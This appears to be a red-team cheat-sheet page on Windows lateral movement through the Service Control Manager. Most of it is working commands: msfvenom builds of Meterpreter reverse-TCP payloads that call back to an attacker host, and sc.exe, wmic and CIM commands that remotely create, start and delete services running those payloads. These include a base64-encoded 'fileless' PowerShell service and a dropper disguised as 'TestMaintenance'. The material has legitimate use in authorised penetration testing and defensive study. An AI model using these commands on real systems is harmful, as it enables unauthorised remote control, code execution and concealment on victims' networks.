---
author(s):
  - Userware
tags:
  - post-exploitation
  - lateral-movement
  - service-control-manager
  - living-off-the-land
  - windows
---
# Living off the Land

## 01 - Usage

After we generate a reverse/bind shell refer to the techniques to copy the shell via [[Windows Lateral Movement References|SMB]].

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> exitfunc=thread -f exe-service -o payloadsvc.exe

$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> exitfunc=thread -f psh-cmd
```

Here's the following syntax

```
C:\> sc.exe \\<IP> create <ServiceSVC> binpath= "c:\path\to\payloadsvc.exe"

C:\> sc.exe \\<IP> start <ServiceSVC>

C:\> sc.exe \\<IP> delete <ServiceSVC>
```

TODO: Convert to cmdlet

```
C:\> wmic.exe [/node:<IP>] [/user:<username> /password:<password>] service <service_name> call startservice
```

```powershell
PS C:\> $session = New-CimSession -ComputerName <IP> -Credential (Get-Credential)
Get-CimInstance -CimSession $session -ClassName Win32_Service -Filter "Name='<service_name>'" | ForEach-Object { $_.StartService() }

Remove-CimSession -CimSession $session
```

## 02 - Use Cases

### 2.1 - Fileless Payload

```
C:\> sc.exe \\<IP> create pwshpayload binpath= "powershell -E <base64_encoded>"

C:\> sc.exe \\<IP> start pwshpayload

C:\> sc.exe \\<IP> delete pwshpayload
```

### 2.1 - Dropper Payload

```
C:\> sc.exe \\<IP> create TestMaintenance binpath= "c:\path\to\payloadsvc.exe"

C:\> sc.exe \\<IP> start TestMaintenance

C:\> sc \\<IP> delete TestMaintenance
```

---
## References

### LOFLCAB

- [LOFLCAB: Service Control Manager](https://lofl-project.github.io/loflcab/Binaries/sc/)

### Hacking Articles

- [Hacking Articles: Remote Services (Mitre:T1021)](https://www.hackingarticles.in/lateral-movement-remote-services-mitret1021/)

### evilcomrade

- [evilcomrade: Windows Lateral Movement Fu](https://1evilcomrade.blogspot.com/2017/11/windows-lateral-movement-fu.html)

### Riccardo Ancarnai

- [Riccardo Ancarani: Red Team Adventures - Lateral Movement Windows and Active Directory](https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/)

### nv2lt

- [nv2lt: Windows Lateral Movement with SMB, PsExec and Alternatives](https://nv2lt.github.io/windows/smb-psexec-smbexec-winexe-how-to/)